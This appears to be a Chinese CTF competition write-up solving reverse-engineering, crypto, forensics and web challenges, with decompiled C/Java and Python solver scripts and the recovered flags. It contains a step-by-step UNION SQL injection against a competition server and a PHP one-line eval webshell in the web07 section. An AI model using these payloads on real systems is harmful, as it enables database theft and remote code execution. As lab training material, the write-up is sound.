### Reverse

- [re1](#re1)

- [re2](#re2)

- [re3-安卓](#re3-安卓)

### Crypto

- [签到题](#签到题)

- [base？谁是多余的](#base谁是多余的)

- [VG](#VG)

- [rsa](#rsa)



### 签到题

上来先写密码签到题，打开`.txt`文件后可以看到以下字符串：

```
666C61677B77656C636F6D655F746F5F6374665F656E6A6F795F616E645F686176655F66756E217D
```

盲猜这是`16`进制的`ASCII`码字符串，编写`Python`代码进行求解：

```python
flag = bytes.fromhex('666C61677B77656C636F6D655F746F5F6374665F656E6A6F795F616E645F686176655F66756E217D').decode('utf-8')
print(flag) # flag{welcome_to_ctf_enjoy_and_have_fun!}
```

------

### re1

接着写了逆向的签到题`re1.exe`，先用`file`查看文件，发现是`64`位的。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ file re1.exe                                             

re1.exe: PE32+ executable (console) x86-64, for MS Windows
```

用`IDA pro 64bit`打开`re1.exe`，按下`F5`对汇编语言进行反编译，可以看到`C`语言的代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char v4; // dl
  char Str[100]; // [rsp+20h] [rbp-70h] BYREF
  int v6; // [rsp+84h] [rbp-Ch]
  int v7; // [rsp+88h] [rbp-8h]
  int i; // [rsp+8Ch] [rbp-4h]

  _main(argc, argv, envp);
  puts("Welcome to the re1 !");
  puts("Please input your flag:");
  scanf("%s", Str);
  v7 = strlen(Str);
  v6 = strlen(str2);
  if ( v7 == v6 )
  {
    for ( i = 0; i < v7; ++i )
    {
      if ( (i & 1) != 0 )
        v4 = Str[i] + 2;
      else
        v4 = Str[i] - 2;
      Str[i] = v4;
    }
    if ( !strcmp(Str, str2) )
      printf("you win, the input is flag, don't forget add flag{}");
    else
      puts("wrong flag");
    result = 0;
  }
  else
  {
    puts("you are wrong");
    result = 0;
  }
  return result;
}
```

审计代码可以发现，用户输入的字符串和字符串`"aqlipcrwjcrkmp]{mw]imv]oc"`进行了异或运算，编写`Python`代码进行异或运算得到`congratulation_you_got_me`，提交`flag{congratulation_you_got_me}`。

```python
s = 'aqlipcrwjcrkmp]{mw]imv]oc'
flag = ''
for i, x in enumerate(s):
	if i & 1:
		flag += chr(ord(x)-2)
	else:
		flag += chr(ord(x)+2)
print(f'flag{{{flag}}}') # flag{congratulation_you_got_me}
```

------

### Web01

`sql`注入，可以直接用`sqlmap`无脑爆破，我是用`sql`语句进行求解的。`union select`可以进行联合查询，`group_concat()`把产生的同一个分组的值用逗号连接成一个字符串，`information_schema.schemata`表示`information_schema`库中一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1, group_concat(schema_name) from information_schema.schemata
```

http://101.42.246.196:23001/?id=-1%20union%20select%201,group_concat(schema_name)%20from%20information_schema.schemata 可以得到结果：

```
ctftraining,f14g,information_schema,mysql,performance_schema,test
```

`group_concat()`把产生的同一个分组的值用逗号连接成一个字符串，`information_schema.tables`中存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，可以在输入框输入以下代码查询到`f14g`的表信息：

```sql
?id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema="f14g"
```

http://101.42.246.196:23001/?id=-1%20union%20select%201,%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22f14g%22 可以得到结果：

```
Flag666,passage
```

`group_concat()`把产生的同一个分组的值用逗号连接成一个字符串，`information_schema.columns`中存了表中所有列的信息，`table_name`表的名字和`table_schema`一一对应，上次查询中有个表叫`Flag666`，可以去查询该表的列信息：

```sql
?id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name="Flag666"
```

http://101.42.246.196:23001/?id=-1%20union%20select%201,%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%22Flag666%22 可以得到结果：

```
flag
```

最后输入以下代码可以根据flag字段查询到该字段的数据。

```sql
?id=-1 union select 1, group_concat(flag) from f14g.Flag666
```

http://101.42.246.196:23001/?id=-1%20union%20select%201,%20group_concat(flag)%20from%20f14g.Flag666 可以得到结果：

```
flag{easy_union_sql!}
```

------

### [re2.exe](#reverse2)

逆向的第二题`re2.exe`，先用`file`查看文件，发现是`32`位的。直接用`IDA pro 32bit`打开`re2.exe`，按下`F5`对汇编语言进行反编译，可以看到`C`语言的代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char Destination[100]; // [esp+1Dh] [ebp-E3h] BYREF
  _BYTE v5[15]; // [esp+81h] [ebp-7Fh] BYREF
  char Str[100]; // [esp+90h] [ebp-70h] BYREF
  size_t v7; // [esp+F4h] [ebp-Ch]
  char *v8; // [esp+F8h] [ebp-8h]
  int i; // [esp+FCh] [ebp-4h]

  __main();
  v5[0] = 114;
  v5[1] = 96;
  v5[2] = 103;
  v5[3] = 103;
  v5[4] = 90;
  v5[5] = 90;
  v5[6] = 101;
  v5[7] = 100;
  v5[8] = 91;
  v5[9] = 85;
  v5[10] = 88;
  v5[11] = 96;
  v5[12] = 96;
  v5[13] = 85;
  v5[14] = 18;
  v8 = v5;
  puts("Welcome to the re2 !");
  puts("Please input your flag:");
  scanf("%s", Str);
  v7 = strlen(Str);
  if ( v7 == 21 )
  {
    strncpy(Destination, Str, 5u);
    if ( check(Destination) )
    {
LABEL_4:
      puts("wrong");
      result = 0;
    }
    else
    {
      for ( i = 5; i <= 15; i += 5 )
      {
        strncpy(Destination, &Str[i], 5u);
        if ( check2(Destination, v8, i) )
          goto LABEL_4;
        v8 += 5;
      }
      if ( Str[v7 - 1] == 125 )
        puts("Well done, you got it");
      else
        puts("You are only one step away from success");
      result = 0;
    }
  }
  else
  {
    puts("maybe the length is wrong");
    result = 0;
  }
  return result;
}
```

##### 解法1：

可以看到用户输入的字符串被进行一系列处理后做了对比，如果输入正确则输出`"Well done, you got it"`。一般这种题，直接`Angr`大法好，打开`Jupyter Notebook`连接服务器，动态符号执行就能解出`flag`：`flag{well_done_good!}`。

```python
import angr

proj = angr.Project("./re2.exe")

target_addr = 0x40152f
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=target_addr)
state = simgr.found[0]
print(state.posix.dumps(0)) # flag{well_done_good!}
```

![](https://paper.tanyaodan.com/img/angr_re2.png)

##### 解法2：

代码审计后根据程序逻辑编写`Python`代码：

```python
s = [114,96,103,103,90,90,101,100,91,85,88,96,96,85,18]
flag = ''
for i in range(0, 15, 5):
	for x in s[i:i+5]:
		flag += chr(x+i+5)

print(f'flag{{{flag}}}') # flag{well_done_good!}
```

------

### rsa

密码学的第四题，打开`txt`文件后可以看到以下信息，给定了`n1`，`n2`，`e1`，`e2`，`c1`，`c2`的值。

```
n1 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
n2 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
e1 = 2333
e2 = 23333
c1 = 1316116662134770690879814362103839780623420120527248536043840592146479052480574077985474161623763978563721124073172820410730492348846200098142706235343164470686127445583938273863894304189618247054649514955176136464273395879832878841555224421879457659795562326746943199675846414637238040550327393009642569894024250271081839428945999237716296592560124669418322569188493036148885333003876760965512925618500360394774816066758106739359762817644284120811162065280330204951295150904138010974815308787047834776406610525102814356091515999954110712767658162496023213125548829820563945272374105274832862682574678195529192009516
c2 = 6485241395763328009719746130709898541269729483150505308808259329749145687803066648274311801821624527910483266170666538736992203392620205417714840881369386852010836477498279266591695876758050686740322941452286584178315830797555697887040771666991377055060541491757349967338300117181859105577325308779010792879713808168285776399372981366988860647334022480774711504685240194804912592209253106123423232743785805952113875347267336118332317990496240807273787216894980604742600774512296661048914646776553393778079057461747246478299158814839681875752645552215714984659603917168300453505504140987829883479097467840565806608012
```

发现`n1`和`n2`的值相等，编写`Python`代码进行`RSA`共模攻击

```python
from gmpy2 import invert
import libnum
import binascii

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

n = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
e1 = 2333
c1 = 1316116662134770690879814362103839780623420120527248536043840592146479052480574077985474161623763978563721124073172820410730492348846200098142706235343164470686127445583938273863894304189618247054649514955176136464273395879832878841555224421879457659795562326746943199675846414637238040550327393009642569894024250271081839428945999237716296592560124669418322569188493036148885333003876760965512925618500360394774816066758106739359762817644284120811162065280330204951295150904138010974815308787047834776406610525102814356091515999954110712767658162496023213125548829820563945272374105274832862682574678195529192009516    
c2 = 6485241395763328009719746130709898541269729483150505308808259329749145687803066648274311801821624527910483266170666538736992203392620205417714840881369386852010836477498279266591695876758050686740322941452286584178315830797555697887040771666991377055060541491757349967338300117181859105577325308779010792879713808168285776399372981366988860647334022480774711504685240194804912592209253106123423232743785805952113875347267336118332317990496240807273787216894980604742600774512296661048914646776553393778079057461747246478299158814839681875752645552215714984659603917168300453505504140987829883479097467840565806608012
e2 = 23333
s = egcd(e1, e2)
s1 = s[1]
s2 = s[2]

if s1 < 0:
    s1 = - s1
    c1 = invert(c1, n)
elif s2 < 0:
    s2 = - s2
    c2 = invert(c2, n)

m = pow(c1,s1,n)*pow(c2,s2,n) % n
flag = binascii.unhexlify(hex(m)[2:]).decode('utf-8')
print(flag) # flag{01d80670b01b654fe4831a3e81870734}
```

------

这些题是写到一般没思路的题。

##### 图片隐写

`foremost -i`可以分理出`rabbit.txt`里面有这个字符串：

```
U2FsdGVkX1/xvgrmnK5HYx8vVZdl9cOGAXlXmuuZCCeOqxZFeX4exz7CcA==
```

`base62`解码后坐牢了。

```
169339162534172731387296180828740647011502793225934179822769720289962156084335331631609620002147511299997696
```

亮哥提示是`rabbit`加密，密钥在图片的详细信息里，寻找未果。

------

##### 压缩包

解压缩后得到`.docx`文件，修改后缀为`.zip`后解压缩我人傻了，继续蹲大牢。

亮哥提示这题是打开`.docx`文件，把图片移开，`ctrl`+`A`全选给文字上色，得到百度网盘链接，那个压缩包才是真正的题目。解压后得到俩个压缩包，一个真压缩包暴力破解，一个伪压缩包可以用`7z`打开是个二维码，扫码拼接字符串得到`flag`。

------

##### web02

尝试多种`sql`注入求解未果，直接被猫猫警告蹲大牢。

![](https://paper.tanyaodan.com/img/cat_warning.png)

------

##### web06

可以看到这行代码，`GET`请求直接跳转百度首页，尝试抓包未果。

```
?address=www.baidu.com
```

------

##### web07

这道题应该是一句话木马，`.php`文件写好了，上传文件未果，说是只能上传`png`，`jpg`，`gif`这三种文件，`Burp Suite pro`修改上传文件类型未果。

```php
<?php eval($_POST['fuck']); ?>
```

### 流量包

追踪`HTTP`流可以得到：

```
SEVCVFVDVEYlN0JmMWFnXzFzX3czbl9kNG8lN0Q=
```

![](https://paper.tanyaodan.com/img/youjun_wireshark.png)

编写`Python`代码进行`base64`解码，提交`HEBTUCTF{Bf1ag_1s_w3n_d4o}`即可。

```python
import base64

flag = base64.b64decode('SEVCVFVDVEYlN0JmMWFnXzFzX3czbl9kNG8lN0Q=')
print(flag.decode('utf-8')) # HEBTUCTF%7Bf1ag_1s_w3n_d4o%7D
```

------

### base？谁是多余的

**比赛时：**

谁是多余的？我是多余的，50分的白给题都写不出来。

```
LJWXQ2C2GN2HGYRSHFZFQM3ENneed5RDCOLQMMYTS5LCGNJGMYTNKZWFURRZOBRGYOLNMJDUM3TGKE6T2===
```

`base62`解码后，不知道咋办啦，不是`16`进制的`ASCII`码字符串，也不是`base64`字符串。

```
1250817256001227640585440340463189743117571458423394069459336446138395188175406684183750268995218703423172621848137005336721600711692166847734715777024
```

**正解：**

把小写字母`need`删除掉后，得到以下字符串：

```
LJWXQ2C2GN2HGYRSHFZFQM3EN5RDCOLQMMYTS5LCGNJGMYTNKZWFURRZOBRGYOLNMJDUM3TGKE6T2===
```

对以上字符串进行`base32`解码：

```
ZmxhZ3tsb29rX3dob19pc19ub3RfbmVlZF9pbl9mbGFnfQ==
```

接着再进行`base64`解码得到`flag`：

```
flag{look_who_is_not_need_in_flag}
```

------

### re3-安卓

**比赛时：**

用`Android-Killer`打开后不知道怎么对`.smali`下手，安卓逆向题刷得少了，我太菜了，得多练习。

**正解：**

用`JEB`打开后反编译，可以看到`MainActivity`中的`Java`代码如下：

```java
package com.example.flag;

import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.app.ActionBarActivity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View$OnClickListener;
import android.view.View;
import android.view.ViewGroup;

public class MainActivity extends ActionBarActivity {
    public class PlaceholderFragment extends Fragment {
        public PlaceholderFragment() {
            super();
        }

        public View onCreateView(LayoutInflater arg4, ViewGroup arg5, Bundle arg6) {
            return arg4.inflate(0x7F030018, arg5, false);
        }
    }

    public MainActivity() {
        super();
    }

    protected void onCreate(Bundle arg7) {
        super.onCreate(arg7);
        this.setContentView(0x7F030017);
        if(arg7 == null) {
            this.getSupportFragmentManager().beginTransaction().add(0x7F05003C, new PlaceholderFragment()).commit();
        }

        this.findViewById(0x7F05003F).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F05003D), this.findViewById(0x7F05003E)) {
            public void onClick(View arg13) {
                int v11 = 0x1F;
                int v9 = 2;
                int v2 = 1;
                String v6 = this.val$editview.getText().toString();
                if(v6.length() != 0x20 || v6.charAt(v11) != 97 || v6.charAt(1) != 98 || v6.charAt(0) + v6.charAt(v9) - 0x30 != 56) {
                    v2 = 0;
                }

                if(v2 == 1) {
                    char[] v5 = "dd2940c04462b4dd7c450528835cca15".toCharArray();
                    v5[v9] = ((char)(v5[v9] + v5[3] - 50));
                    v5[4] = ((char)(v5[v9] + v5[5] - 0x30));
                    v5[30] = ((char)(v5[v11] + v5[9] - 0x30));
                    v5[14] = ((char)(v5[27] + v5[28] - 97));
                    int v4;
                    for(v4 = 0; v4 < 16; ++v4) {
                        char v0 = v5[0x1F - v4];
                        v5[0x1F - v4] = v5[v4];
                        v5[v4] = v0;
                    }

                    this.val$textview.setText("flag{" + String.valueOf(v5) + "}");
                }
                else {
                    this.val$textview.setText("输入注册码错误");
                }
            }
        });
    }

    public boolean onCreateOptionsMenu(Menu arg3) {
        this.getMenuInflater().inflate(0x7F0C0000, arg3);
        return 1;
    }

    public boolean onOptionsItemSelected(MenuItem arg3) {
        boolean v1 = arg3.getItemId() == 0x7F050040 ? true : super.onOptionsItemSelected(arg3);
        return v1;
    }
}
```
直接把代码中和`flag`相关的部分拿出来跑一下就可以得到`flag{59acc538825054c7de4b26440c0999dd}`。

```java
public class Main {
    public static void main(String[] args) {
        int v11 = 0x1F;
        int v9 = 2;
        int v2 = 1;
        char[] v5 = "dd2940c04462b4dd7c450528835cca15".toCharArray();
        v5[v9] = ((char)(v5[v9] + v5[3] - 50));
        v5[4] = ((char)(v5[v9] + v5[5] - 0x30));
        v5[30] = ((char)(v5[v11] + v5[9] - 0x30));
        v5[14] = ((char)(v5[27] + v5[28] - 97));
        int v4;
        for(v4 = 0; v4 < 16; ++v4) {
            char v0 = v5[0x1F - v4];
            v5[0x1F - v4] = v5[v4];
            v5[v4] = v0;
        }
        System.out.println("flag{" + String.valueOf(v5) + "}");
    }
}
```

------

### [VG](#crypto3)

**比赛时：**

```
密文：cowahqeyxyxlgwrbtdaerokqggilsk
秘钥：AAAABAAAAAAAABAABBBAABBAB
```

试了一手培根加密，根据`AAAABAAAAAAAABAABBBAABBAB`得到`bacpo`，这个应该是真密钥吧，结果求解未果。

```
培根加密
AAAAB b
AAAAA a
AAABA c
ABBBA p
ABBAB o

假密钥：bacpo
真密钥：bacon
维多利亚密码：
```

------

**正解：**

培根加密有两种。
